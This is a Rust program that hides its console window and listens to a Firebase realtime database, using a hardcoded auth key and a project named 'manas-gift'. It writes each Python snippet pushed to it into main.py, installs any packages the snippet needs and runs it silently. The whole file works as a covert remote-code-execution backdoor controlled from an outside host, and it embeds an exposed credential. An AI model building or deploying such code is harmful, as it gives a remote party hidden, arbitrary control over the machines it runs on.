#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use eventsource_client::Client;
use eventsource_client::ClientBuilder;
use futures_util::StreamExt;
use launchdarkly_sdk_transport::HyperTransport;
use rustpython_parser::Parse;
use rustpython_parser::ast::{Stmt, Suite};
use std::fs::write;
use std::process::Command;
use std::time::Duration;
use serde::Deserialize;

#[derive(Deserialize, Debug)]
#[allow(dead_code)]
struct Payload {
    path: String,
    data: String,
}

#[tokio::main]
async fn main() {
    let project_id = "manas-gift-default-rtdb";
    let api_key = "kSkIQOpYpGISSMB4QxWZx3W7CDm2wabrC7fLQVC8";

    let url = format!(
        "https://{0}.firebaseio.com/payload.json?auth={1}",
        project_id, api_key
    );

    let transport = HyperTransport::builder()
        .connect_timeout(Duration::from_secs(10))
        .read_timeout(Duration::from_secs(30))
        .build_https()
        .unwrap();

    let client = ClientBuilder::for_url(&url)
        .unwrap()
        .build_with_transport(transport);

    let mut stream = client.stream();

    let mut first_received = false;

    while let Some(event) = stream.next().await {
        match event {
            Ok(eventsource_client::SSE::Event(e)) => {
                if !first_received {
                    first_received = true;
                    continue
                }

                let payload: serde_json::Result<Payload> = serde_json::from_str(&e.data);
                if !payload.is_err() {
                    run_python_function(&payload.unwrap().data);
                }
            }
            Err(_) => {}
            _ => {}
        }
    }
}

fn run_python_function(source: &str) {
    let imports = get_imports(&source);
    let import_text = get_install_packages_text(imports);

    write("main.py", format!("{}\n{}", import_text.as_str(), source))
        .expect("Failed to write to file!");

    Command::new("python3")
        .arg("main.py")
        .output()
        .expect("Failed to run python");
}

fn get_imports(source: &str) -> Vec<String> {
    let statements = Suite::parse(source, "<embedded>").expect("Failed to parse");
    let mut imports = Vec::<String>::new();

    for statement in statements {
        match statement {
            Stmt::Import(import_statement) => {
                imports.push(import_statement.names[0].name.to_string());
            }
            Stmt::ImportFrom(import_from_statement) => {
                imports.push(import_from_statement.module.unwrap().to_string());
            }
            _ => {}
        }
    }

    imports
}

fn get_install_packages_text(imports: Vec<String>) -> String {
    format!(
        "import subprocess
import sys

packages = {:?}

to_install = [p for p in packages if p not in sys.stdlib_module_names]

if len(to_install) > 0:
    subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\", *to_install])
",
        imports
    )
}
